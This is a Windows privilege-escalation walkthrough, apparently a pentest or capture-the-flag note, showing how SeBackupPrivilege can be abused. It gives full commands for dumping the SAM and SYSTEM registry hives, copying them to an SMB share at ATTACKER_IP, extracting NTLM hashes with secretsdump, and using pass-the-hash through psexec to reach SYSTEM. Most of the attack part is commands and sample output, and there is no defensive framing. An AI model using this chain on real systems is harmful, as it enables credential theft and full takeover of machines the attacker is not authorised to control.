SeBackupPrivilege allows a user to **read any file on the system regardless of NTFS permissions (DACLs)**. This privilege is typically assigned to:

- Backup Operators
    
- Administrators
    
- Certain service accounts
    

The key detail is that **this privilege bypasses access control checks when reading files**, meaning even protected files such as registry hives can be accessed without being an administrator.

To verify if the privilege is present:

```cmd
whoami /priv
```

Relevant output:

```text
SeBackupPrivilege             Back up files and directories             Enabled
```

If the privilege is enabled, it becomes a strong local privilege escalation vector.

---

## Bypassing file permissions using backup semantics

Normally, Windows enforces file access through DACLs. However, SeBackupPrivilege allows processes to open files using backup APIs, ignoring these restrictions.

This makes it possible to access sensitive files such as:

- SAM (local user hashes)
    
- SYSTEM (boot key)
    
- SECURITY (LSA secrets)
    

These files are normally restricted even to administrators when the system is running.

---

## Extracting SAM and SYSTEM hives

The most common abuse is dumping registry hives to extract password hashes.

First, create a writable directory:

```cmd
mkdir C:\temp
```

Then dump the registry hives:

```cmd
reg save HKLM\SAM C:\temp\SAM.hive
reg save HKLM\SYSTEM C:\temp\SYSTEM.hive
```

If the privilege is properly enabled, this works even without administrator rights.

---

## Exfiltrating the hives to attacker machine

Start an SMB server on the attacker machine:

```bash
mkdir share
python3 smbserver.py -smb2support -username user -password pass public share
```

From the target:

```cmd
copy C:\temp\SAM.hive \\ATTACKER_IP\public
copy C:\temp\SYSTEM.hive \\ATTACKER_IP\public
```

This transfers the sensitive registry files for offline analysis.

---

## Extracting password hashes

Use Impacket’s secretsdump to parse the hives:

```bash
python3 secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL
```

Example output:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
```

This provides NTLM hashes for local accounts.

---

## Lateral movement using Pass-the-Hash

With the extracted hash, authentication can be performed without knowing the plaintext password.

Example using PsExec:

```bash
python3 psexec.py -hashes <LM:NTLM> administrator@TARGET_IP
```

If successful, this results in:

```text
NT AUTHORITY\SYSTEM
```

This effectively converts SeBackupPrivilege into full administrative access.
e